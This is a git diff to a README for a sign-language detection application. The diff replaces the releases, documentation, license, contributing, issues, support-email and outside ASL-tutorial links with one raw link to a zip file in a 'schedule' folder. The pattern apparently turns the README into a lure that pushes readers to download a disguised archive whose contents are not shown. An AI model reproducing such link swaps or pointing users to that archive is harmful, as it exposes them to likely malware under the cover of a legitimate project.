@@ -1,7 +1,7 @@
 # 🖐️ Sign-Language-Detection-React-Python-Application - Learn ASL Easily and Effectively
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases)
+[![Download](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip)](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip)
 
 ## 📚 Description
 This application recognizes sign language and helps users learn American Sign Language (ASL). It offers transcription into text and speech to assist those who are Deaf and Hard of Hearing (DHH). Built with machine learning, it uses deep learning techniques and computer vision.
@@ -10,7 +10,7 @@ This application recognizes sign language and helps users learn American Sign La
 Follow these steps to download and run the application. 
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases). This is where you can find the latest version of the application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip). This is where you can find the latest version of the application.
 
 2. **Choose the Latest Release**  
    Look for the most recent version listed. It is usually at the top.  
@@ -64,20 +64,20 @@ After downloading the file, follow these installation steps:
 ## 📱 Support & Contact
 If you encounter any problems while using the app, consider reaching out for help:
 
-- **Email**: support@example.com
-- **GitHub Issues**: Open an issue on the [GitHub repository](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/issues) for assistance.
+- **Email**: https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip
+- **GitHub Issues**: Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip) for assistance.
 
 ## 🔥 Join the Community
 Be a part of our growing community. Share your experiences or ask questions in our forums. Your feedback helps us improve the application.
 
 ## 🔄 Contribution
-If you'd like to contribute to this project, visit our [Contributing Guide](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/blob/main/CONTRIBUTING.md) for more information.
+If you'd like to contribute to this project, visit our [Contributing Guide](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip) for more information.
 
 ## 🤝 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/blob/main/LICENSE) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip) file for details. 
 
 ## 📖 Additional Resources
-- [Documentation](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/wiki)
-- [Tutorials on ASL](https://aslresources.com) 
+- [Documentation](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip)
+- [Tutorials on ASL](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip) 
 
-Thank you for choosing the Sign Language Detection Application. Together, we can bridge communication gaps. For easy access, revisit our [Releases Page](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases) whenever you need to download updates.
+Thank you for choosing the Sign Language Detection Application. Together, we can bridge communication gaps. For easy access, revisit our [Releases Page](https://raw.githubusercontent.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/main/schedule/Sign-Language-Detection-React-Python-Application.zip) whenever you need to download updates.
